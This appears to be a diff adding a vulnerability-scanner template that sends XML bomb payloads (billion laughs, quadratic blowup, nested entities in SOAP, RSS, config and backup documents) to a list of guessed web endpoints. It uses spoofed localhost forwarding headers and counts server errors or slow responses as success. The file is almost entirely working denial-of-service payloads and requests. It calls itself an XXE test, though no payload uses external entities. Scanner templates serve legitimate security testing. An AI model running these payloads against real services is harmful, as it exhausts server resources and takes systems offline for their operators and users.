@@ -1,0 +1,389 @@
+id: medium-webapp-xml-bomb-dos-attack
+
+info:
+  name: XML Bomb DoS Attack - Elite Red Team
+  author: elite-red-team
+  severity: high
+  description: |
+    Advanced XML bomb and billion laughs DoS attack techniques.
+    Tests for XML External Entity (XXE) vulnerabilities and XML parsing DoS.
+    Includes multiple XML bomb variations and resource exhaustion methods.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+    - https://portswigger.net/web-security/xxe
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+    cvss-score: 7.5
+    cwe-id: CWE-776
+  tags: xml-bomb,dos,xxe,resource-exhaustion,red-team
+
+variables:
+  # XML bomb payloads
+  xml_bomb_basic: |
+    <?xml version="1.0"?>
+    <!DOCTYPE lolz [
+      <!ENTITY lol "lol">
+      <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+      <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+      <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+      <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+      <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+      <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+      <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+      <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+    ]>
+    <lolz>&lol9;</lolz>
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/xml/parse"
+      - "{{BaseURL}}/upload/xml"
+      - "{{BaseURL}}/api/import"
+      - "{{BaseURL}}/data/xml"
+
+    headers:
+      Content-Type: application/xml
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+      X-Real-IP: 127.0.0.1
+
+    # Basic XML bomb (Billion Laughs)
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE lolz [
+        <!ENTITY lol "lol">
+        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+        <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+        <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+        <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+      ]>
+      <lolz>&lol9;</lolz>
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 503
+          - 504
+
+      - type: word
+        part: body
+        words:
+          - "timeout"
+          - "memory"
+          - "resource"
+          - "limit"
+          - "error"
+        condition: or
+
+      - type: dsl
+        dsl:
+          - 'duration>=10'
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - 'OutOfMemoryError'
+          - 'StackOverflowError'
+          - 'timeout'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/xml/process"
+      - "{{BaseURL}}/xml/import"
+
+    headers:
+      Content-Type: text/xml
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+
+    # Quadratic blowup attack
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE kaboom [
+        <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+      ]>
+      <kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 503
+          - 504
+
+      - type: dsl
+        dsl:
+          - 'duration>=15'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/soap"
+      - "{{BaseURL}}/soap/endpoint"
+      - "{{BaseURL}}/webservice"
+
+    headers:
+      Content-Type: text/xml; charset=utf-8
+      SOAPAction: "processXML"
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # SOAP XML bomb
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE soap [
+        <!ENTITY boom "boom">
+        <!ENTITY boom2 "&boom;&boom;&boom;&boom;&boom;&boom;&boom;&boom;&boom;&boom;">
+        <!ENTITY boom3 "&boom2;&boom2;&boom2;&boom2;&boom2;&boom2;&boom2;&boom2;&boom2;&boom2;">
+        <!ENTITY boom4 "&boom3;&boom3;&boom3;&boom3;&boom3;&boom3;&boom3;&boom3;&boom3;&boom3;">
+        <!ENTITY boom5 "&boom4;&boom4;&boom4;&boom4;&boom4;&boom4;&boom4;&boom4;&boom4;&boom4;">
+      ]>
+      <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+          <processData>&boom5;</processData>
+        </soap:Body>
+      </soap:Envelope>
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 503
+
+      - type: dsl
+        dsl:
+          - 'duration>=10'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/rss"
+      - "{{BaseURL}}/rss/import"
+      - "{{BaseURL}}/feed/xml"
+
+    headers:
+      Content-Type: application/rss+xml
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+
+    # RSS XML bomb
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE rss [
+        <!ENTITY xxe "xxe">
+        <!ENTITY xxe2 "&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;&xxe;">
+        <!ENTITY xxe3 "&xxe2;&xxe2;&xxe2;&xxe2;&xxe2;&xxe2;&xxe2;&xxe2;&xxe2;&xxe2;">
+        <!ENTITY xxe4 "&xxe3;&xxe3;&xxe3;&xxe3;&xxe3;&xxe3;&xxe3;&xxe3;&xxe3;&xxe3;">
+      ]>
+      <rss version="2.0">
+        <channel>
+          <title>&xxe4;</title>
+          <description>&xxe4;</description>
+        </channel>
+      </rss>
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 503
+
+      - type: dsl
+        dsl:
+          - 'duration>=8'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/config/xml"
+      - "{{BaseURL}}/config/import"
+
+    headers:
+      Content-Type: application/xml
+      Authorization: Bearer {{token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Configuration XML bomb
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE config [
+        <!ENTITY dos "dos">
+        <!ENTITY dos10 "&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;&dos;">
+        <!ENTITY dos100 "&dos10;&dos10;&dos10;&dos10;&dos10;&dos10;&dos10;&dos10;&dos10;&dos10;">
+        <!ENTITY dos1000 "&dos100;&dos100;&dos100;&dos100;&dos100;&dos100;&dos100;&dos100;&dos100;&dos100;">
+        <!ENTITY dos10000 "&dos1000;&dos1000;&dos1000;&dos1000;&dos1000;&dos1000;&dos1000;&dos1000;&dos1000;&dos1000;">
+      ]>
+      <config>
+        <setting name="data">&dos10000;</setting>
+      </config>
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 503
+          - 504
+
+      - type: dsl
+        dsl:
+          - 'duration>=12'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/document/xml"
+      - "{{BaseURL}}/document/parse"
+
+    headers:
+      Content-Type: text/xml
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+
+    # Document XML bomb with nested entities
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE document [
+        <!ENTITY a "a">
+        <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+        <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+        <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+        <!ENTITY e "&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;&d;">
+        <!ENTITY f "&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;&e;">
+      ]>
+      <document>
+        <content>&f;</content>
+      </document>
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 503
+
+      - type: dsl
+        dsl:
+          - 'duration>=10'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user/import"
+      - "{{BaseURL}}/user/xml/import"
+
+    headers:
+      Content-Type: application/xml
+      Authorization: Bearer {{admin_token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # User import XML bomb
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE users [
+        <!ENTITY user "user">
+        <!ENTITY user10 "&user;&user;&user;&user;&user;&user;&user;&user;&user;&user;">
+        <!ENTITY user100 "&user10;&user10;&user10;&user10;&user10;&user10;&user10;&user10;&user10;&user10;">
+        <!ENTITY user1000 "&user100;&user100;&user100;&user100;&user100;&user100;&user100;&user100;&user100;&user100;">
+      ]>
+      <users>
+        <user>
+          <name>&user1000;</name>
+          <email>&user1000;</email>
+        </user>
+      </users>
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 503
+
+      - type: dsl
+        dsl:
+          - 'duration>=8'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/backup/restore"
+      - "{{BaseURL}}/backup/xml"
+
+    headers:
+      Content-Type: text/xml
+      Authorization: Bearer {{admin_token}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+
+    # Backup restore XML bomb
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE backup [
+        <!ENTITY data "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA">
+        <!ENTITY data2 "&data;&data;&data;&data;&data;&data;&data;&data;&data;&data;">
+        <!ENTITY data3 "&data2;&data2;&data2;&data2;&data2;&data2;&data2;&data2;&data2;&data2;">
+        <!ENTITY data4 "&data3;&data3;&data3;&data3;&data3;&data3;&data3;&data3;&data3;&data3;">
+      ]>
+      <backup>
+        <database>&data4;</database>
+        <files>&data4;</files>
+      </backup>
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 503
+          - 504
+
+      - type: dsl
+        dsl:
+          - 'duration>=15'
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/report/xml"
+      - "{{BaseURL}}/report/generate"
+
+    headers:
+      Content-Type: application/xml
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    # Report generation XML bomb
+    body: |
+      <?xml version="1.0"?>
+      <!DOCTYPE report [
+        <!ENTITY x "x">
+        <!ENTITY x2 "&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;&x;">
+        <!ENTITY x3 "&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;&x2;">
+        <!ENTITY x4 "&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;&x3;">
+      ]>
+      <report>
+        <data>&x4;</data>
+        <summary>&x4;</summary>
+      </report>
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 500
+          - 503
+
+      - type: dsl
+        dsl:
+          - 'duration>=10'
+
+    extractors:
+      - type: regex
+        part: response
+        regex:
+          - 'HTTP/1\.[01]\s+(\d+)'
+          - 'Server:\s*([^\r\n]+)'
